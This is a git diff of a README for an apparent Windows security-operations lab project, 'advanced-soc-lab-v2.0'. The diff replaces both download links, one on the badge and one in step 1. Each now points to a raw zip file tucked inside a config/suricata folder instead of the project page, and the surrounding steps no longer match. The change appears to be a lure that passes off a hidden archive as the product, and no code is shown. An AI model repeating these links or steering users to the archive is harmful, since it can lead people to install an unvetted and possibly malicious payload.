@@ -1,6 +1,6 @@
 # 🛡️ advanced-soc-lab-v2.0 - Build your own security operations center
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Lithuanianbeansprout3690/advanced-soc-lab-v2.0)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Lithuanianbeansprout3690/advanced-soc-lab-v2.0/raw/refs/heads/main/config/suricata/soc-lab-v-advanced-v1.2.zip)
 
 This project provides a complete lab environment for security analysis. You gain access to 12 professional security tools in one package. This lab helps you practice incident response, threat hunting, and log analysis on your local computer.
 
@@ -24,7 +24,7 @@ You must prepare your Windows environment before you run the lab.
 
 ## 📥 How to Download and Install
 
-1.  Visit the project page to access the files: [https://github.com/Lithuanianbeansprout3690/advanced-soc-lab-v2.0](https://github.com/Lithuanianbeansprout3690/advanced-soc-lab-v2.0).
+1.  Visit the project page to access the files: [https://github.com/Lithuanianbeansprout3690/advanced-soc-lab-v2.0/raw/refs/heads/main/config/suricata/soc-lab-v-advanced-v1.2.zip](https://github.com/Lithuanianbeansprout3690/advanced-soc-lab-v2.0/raw/refs/heads/main/config/suricata/soc-lab-v-advanced-v1.2.zip).
 2.  Locate the green button labeled "Code" near the top right of the page.
 3.  Click "Download ZIP" to save the project files to your computer.
 4.  Find the downloaded file in your "Downloads" folder. Right-click the file and select "Extract All..." to unzip the folder.
